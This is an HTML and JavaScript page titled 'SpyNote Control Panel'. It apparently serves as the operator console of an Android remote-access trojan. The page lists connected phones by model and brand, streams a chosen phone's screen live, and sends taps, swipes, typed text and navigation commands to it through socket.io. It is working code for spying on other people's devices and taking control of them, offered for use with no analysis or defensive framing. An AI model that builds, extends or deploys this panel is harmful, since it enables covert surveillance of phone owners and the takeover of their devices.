<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }
        .disconnected { opacity: 0.5; }
        .streaming { border-left: 4px solid #00ff88; }

        #phone-frame {
            width: 360px; height: 760px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; }
        
        #control-panel {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 15px;
            backdrop-filter: blur(10px); text-align: center;
        }
        button {
            padding: 10px 20px; margin: 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,123,255,0.4); }
        button:active { transform: translateY(0); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .control-btn { background: linear-gradient(45deg, #28a745, #20c997); }
        .stop-btn { background: linear-gradient(45deg, #dc3545, #c82333); }
        
        #type-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none; z-index: 1000;
            justify-content: center; align-items: center;
        }
        #type-input-overlay {
            width: 80%; padding: 20px; background: #333; border-radius: 15px;
            text-align: center;
        }
        #type-input-overlay input {
            width: 100%; padding: 15px; margin: 10px 0; border: none; 
            border-radius: 10px; background: #555; color: white; font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="control-panel">
        <button class="control-btn" onclick="toggleStreaming()">üì° Start Stream</button>
        <button class="control-btn" onclick="toggleTypeOverlay()">‚å®Ô∏è Type</button>
        <button class="control-btn" onclick="sendBack()">üîô Back</button>
        <button class="control-btn" onclick="sendHome()">üè† Home</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <div id="type-overlay">
        <div id="type-input-overlay">
            <input type="text" id="type-input" placeholder="Type here & press Enter..." maxlength="200">
            <br>
            <button onclick="sendTypedText()">‚úÖ Send</button>
            <button onclick="toggleTypeOverlay()">‚ùå Cancel</button>
        </div>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920; // ‚úÖ Dynamic from server
        let lastFrameTime = 0, frameCount = 0;
        let startX = 0, startY = 0, dragging = false;
        let frameBuffer = null;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: false });
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const typeOverlay = document.getElementById('type-overlay');
        const typeInput = document.getElementById('type-input');

        // ‚úÖ FIXED Canvas setup
        canvas.width = 360; canvas.height = 760;
        ctx.imageSmoothingEnabled = false;

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ‚úÖ FIXED: Proper screen update with dynamic sizing
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            // ‚úÖ Update device dimensions from server
            if (data.width && data.height) {
                deviceWidth = data.width;
                deviceHeight = data.height;
            }
            
            const img = new Image();
            img.onload = () => {
                // ‚úÖ Dynamic frame buffer matching canvas size
                if (!frameBuffer || frameBuffer.width !== canvas.width || frameBuffer.height !== canvas.height) {
                    frameBuffer = new OffscreenCanvas(canvas.width, canvas.height);
                }
                
                const frameCtx = frameBuffer.getContext('2d');
                frameCtx.imageSmoothingEnabled = false;
                frameCtx.clearRect(0, 0, canvas.width, canvas.height);
                frameCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(frameBuffer, 0, 0);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    fpsCounter.textContent = `FPS: ${fps}`;
                    fpsDisplay.textContent = fps;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''} ${info.streaming ? 'streaming' : ''}" 
                         onclick="selectDevice('${id}', this, ${info.width || 1080}, ${info.height || 1920})">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small>
                        <div style="margin-top: 5px;">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                            ${info.streaming ? ' üì° STREAMING' : ''}
                        </div>
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el, width = 1080, height = 1920) {
            currentDevice = deviceId;
            deviceWidth = width;
            deviceHeight = height;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            console.log(`‚úÖ Selected: ${deviceId} (${width}x${height})`);
        }

        // ‚úÖ FIXED: Perfect coordinate scaling
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse Controls
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (dragging && currentDevice) {
                    const coords = getScaledCoords(
                        e.changedTouches?.[0]?.clientX || e.clientX,
                        e.changedTouches?.[0]?.clientY || e.clientY
                    );
                    sendTap(coords.x, coords.y);
                }
                dragging = false;
            });
        });

        function sendControl(action, x=0, y=0, startX=0, startY=0, endX=0, endY=0, text='') {
            if (!currentDevice) return alert('Select a device first!');
            socket.emit('control', { 
                deviceId: currentDevice, 
                action, 
                x, y, startX, startY, endX, endY, text 
            });
        }

        function sendTap(x, y) { sendControl('tap', x, y); }
        function sendSwipe(sx, sy, ex, ey) { sendControl('swipe', 0, 0, sx, sy, ex, ey); }
        function sendText(text) { sendControl('type', 0, 0, 0, 0, 0, 0, text); }
        function sendBack() { sendControl('back'); }
        function sendHome() { sendControl('home'); }

        // ‚úÖ NEW: Stream Start/Stop Control
        function toggleStreaming() {
            if (!currentDevice) return alert('Select a device first!');
            socket.emit('toggle-stream', { deviceId: currentDevice });
        }
        
        function toggleTypeOverlay() {
            typeOverlay.style.display = typeOverlay.style.display === 'flex' ? 'none' : 'flex';
            if (typeOverlay.style.display === 'flex') typeInput.focus();
        }

        function sendTypedText() {
            const text = typeInput.value.trim();
            if (text) sendText(text);
            typeInput.value = '';
            toggleTypeOverlay();
        }

        typeInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendTypedText();
        });

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') sendBack();
            if (e.key === 't' && e.ctrlKey) toggleTypeOverlay();
            if (e.key === 's' && e.ctrlKey) toggleStreaming();
        });
    </script>
</body>
</html>
